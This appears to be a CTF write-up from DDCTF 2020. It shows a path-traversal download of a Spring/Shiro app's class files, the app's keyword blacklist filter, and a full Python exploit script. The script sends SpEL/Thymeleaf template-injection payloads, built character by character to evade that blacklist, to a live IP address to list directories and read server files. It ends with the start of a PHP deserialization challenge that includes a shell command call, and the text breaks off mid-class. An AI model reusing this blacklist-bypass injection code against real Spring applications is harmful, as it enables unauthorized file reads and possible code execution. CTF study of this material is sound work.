        org.springframework.web.filter.DelegatingFilterProxy
          targetFilterLifecycle
          true
        shiroFilter
        /*
        500
        /error.jsp
        404
        /hacker.jsp
        403
        /hacker.jsp
http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class
    package com.ctf.util;
    import javax.servlet.*;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.util.Enumeration;
    import java.util.regex.Matcher;
    import java.util.regex.Pattern;
    public class SafeFilter implements Filter {
        private static final String[] blacklists = {"java.+lang", "Runtime|Process|byte|OutputStream|session|\"|'", "exec.*\\(", "write|read", "invoke.*\\(", "\\.forName.*\\(", "lookup.*\\(", "\\.getMethod.*\\(", "javax.+script.+ScriptEngineManager", "com.+fasterxml", "org.+apache", "org.+hibernate", "org.+thymeleaf", "javassist", "javax\\.", "eval.*\\(", "\\.getClass\\(", "org.+springframework", "javax.+el", "java.+io"};
        private final String encoding = "UTF-8";
        public void init(FilterConfig arg0) throws ServletException {
        }
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)
                throws IOException, ServletException {
            request.setCharacterEncoding("UTF-8");
            response.setCharacterEncoding("UTF-8");
            Enumeration pNames = request.getParameterNames();
            while (pNames.hasMoreElements()) {
                String name = (String) pNames.nextElement();
                String value = request.getParameter(name);
                for (String blacklist : blacklists) {
                    Matcher matcher = Pattern.compile(blacklist, 34).matcher(value);
                    if (matcher.find()) {
                        HttpServletResponse servletResponse = (HttpServletResponse) response;
                        servletResponse.sendError(403);
                    }
                }
            }
            filterChain.doFilter(request, response);
        }
        public void destroy() {
        }
    }
http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class
    package com.ctf.controller;
    import com.ctf.model.User;
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.IOException;
    import org.apache.shiro.SecurityUtils;
    import org.apache.shiro.subject.Subject;
    import org.springframework.core.io.ClassPathResource;
    import org.springframework.core.io.InputStreamResource;
    import org.springframework.http.HttpHeaders;
    import org.springframework.http.MediaType;
    import org.springframework.http.ResponseEntity;
    import org.springframework.http.ResponseEntity.BodyBuilder;
    import org.springframework.stereotype.Controller;
    import org.springframework.ui.Model;
    import org.springframework.util.DigestUtils;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RequestParam;
    @Controller
    public class IndexController {
        public IndexController() {
        }
        @RequestMapping({"/"})
        public String index() {
            return "redirect:/index";
        }
        @RequestMapping({"/index"})
        public String index(Model model) {
            try {
                Subject subject = SecurityUtils.getSubject();
                User user = (User)subject.getSession().getAttribute("user");
                model.addAttribute("name", user.getUsername());
            } catch (Exception var4) {
                model.addAttribute("name", "user");
            }
            return "index";
        }
        @GetMapping({"/unauthorized"})
        public String unauthorized() {
            return "unauthorized";
        }
        @RequestMapping({"img"})
        public Object img(@RequestParam("img") String img) {
            ResponseEntity response = null;
            try {
                ClassPathResource classPathResource = new ClassPathResource("../../" + img);
                File file = classPathResource.getFile();
                HttpHeaders headers = new HttpHeaders();
                headers.add("Cache-Control", "no-cache, no-store, must-revalidate");
                headers.add("Content-Disposition", "attachment; filename=" + DigestUtils.md5DigestAsHex(img.getBytes()) + ".jpg");
                headers.add("Pragma", "no-cache");
                headers.add("Expires", "0");
                response = ((BodyBuilder)ResponseEntity.ok().headers(headers)).contentType(MediaType.parseMediaType("application/octet-stream")).body(new InputStreamResource(new FileInputStream(file)));
                return response;
            } catch (IOException var6) {
                return "forbidden";
            }
        }
    }
http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class
    package com.ctf.controller;
    import com.ctf.model.Role;
    import com.ctf.model.User;
    import java.util.Iterator;
    import javax.servlet.http.HttpSession;
    import org.apache.shiro.SecurityUtils;
    import org.apache.shiro.authc.UsernamePasswordToken;
    import org.apache.shiro.subject.Subject;
    import org.springframework.stereotype.Controller;
    import org.springframework.ui.Model;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.PostMapping;
    import org.springframework.web.bind.annotation.RequestParam;
    @Controller
    public class AuthController {
        public AuthController() {
        }
        @GetMapping({"/login"})
        public String login() {
            return "login";
        }
        @PostMapping({"/auth"})
        public String auth(@RequestParam("username") String username, @RequestParam("password") String password, HttpSession httpSession, Model model) {
            UsernamePasswordToken usernamePasswordToken = new UsernamePasswordToken(username, password);
            Subject subject = SecurityUtils.getSubject();
            String error = null;
            try {
                subject.login(usernamePasswordToken);
                User user = (User) subject.getPrincipal();
                httpSession.setAttribute("user", user);
                Iterator var9 = user.getRoles().iterator();
                Role role;
                do {
                    if (!var9.hasNext()) {
                        return "redirect:./index";
                    }
                    role = (Role) var9.next();
                } while (!role.getName().equals("admin"));
                return "redirect:./68759c96217a32d5b368ad2965f625ef/index";
            } catch (Exception var11) {
                error = "login failed!";
                model.addAttribute("error", true);
                model.addAttribute("msg", error);
                return "login";
            }
        }
    }
http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index
黑名单还是比较严格的：
    {"java.+lang", 
    "javax.+el",
    "java.+io",
    "write|read|Runtime|Process|byte|OutputStream|session|\"|'",
    "exec.*\\(", 
    "invoke.*\\(", 
    "lookup.*\\(", 
    "eval.*\\(",
    "\\.forName.*\\(",
    "\\.getMethod.*\\(", 
    "\\.getClass\\(", 
    "javax.+script.+ScriptEngineManager", 
    "com.+fasterxml", 
    "org.+apache", 
    "org.+hibernate", 
    "org.+thymeleaf", 
    "org.+springframework",
    "javassist", 
    "javax\\."}
可结合 Thymeleaf 模板本身的特性去绕，或许可以 getshell，我这用的是 SpEL 的 payload 读了文件。
**exp**
    import re
    import requests
    from flask import Flask, request
    app = Flask(__name__)
    def requestToServer(content):
        content = '[[${{{}}}]]'.format(content)
        url = 'http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize'
        response = requests.post(url=url, data={'content': content}).text
        try:
            redirect = re.search('fetch \./(.*) !', response).group(1)
            url = 'http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/'
            url += redirect
            return requests.get(url).text
        except Exception as e:
            return str(e) + response
    def toForNameOrStr(source, strFlag=False):
        res = 'T(Character).toString(%s)' % ord(source[0])
        for ch in source[1:]:
            res += '.concat(T(Character).toString(%s))' % ord(ch)
        if strFlag:
            return res
        return '0.class. forName({})'.format(res)
    @app.route('/', methods=['GET', 'POST'])
    def handler():
        content = request.form.get('content')
        dir = request.form.get('dir')
        file = request.form.get('file')
        if dir:
            # 单层：java.util.Arrays.toString(java.nio.file.Files.list(java.nio.file.Paths.get("/")).toArray());
            # 递归：java.util.Arrays.toString(java.nio.file.Files.walk(java.nio.file.Paths.get("/")).toArray());
            listDirPayload = 'T(java.util.Arrays).toString({}.list({}.get({})).toArray())'.format(
                toForNameOrStr('java.nio.file.Files'), toForNameOrStr('java.nio.file.Paths'), toForNameOrStr(dir, True))
            print(listDirPayload)
            return requestToServer(listDirPayload)
        if file:
            # java.nio.file.Files.lines(java.nio.file.Paths.get("/flag")).findFirst().toString()
            catFilePaylod = '{}.lines({}.get({})).findFirst().toString()'.format(
                toForNameOrStr('java.nio.file.Files'), toForNameOrStr('java.nio.file.Paths'), toForNameOrStr(file, True))
            print(catFilePaylod)
            return requestToServer(catFilePaylod)
        return requestToServer(content)
    if __name__ == '__main__':
        app.run(debug=True)
## Overwrite Me
**题目描述**
    http://117.51.137.166/atkPWsr2x3omRZFi.php
直接给了源码：
    Welcome to DDCTF 2020, Have fun!
    kw0ng = 2;
        }
        public function get_flag()
        {
            return system('find /HackersForever ' . escapeshellcmd($this->flag));
        }
    }
    class HintClass
    {   
        protected  $hint;
        public function execute($value)
        {
            include($value);
        }
        public function __invoke()
        {
            if(preg_match("/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i", $this->hint))
            {
                die("Don't Do That!");
            }
            $this->execute($this->hint);
        }
    }
    class ShowOff
    {
        public $contents;
        public $page;
        public function __construct($file='/hint/hint.php')
        {
            $this->contents = $file;
            echo "Welcome to DDCTF 2020, Have fun!";
        }
        public function __toString()
        {
            return $this->contents();
        }
        public function __wakeup()
        {
            $this->page->contents = "POP me! I can give you some hints!";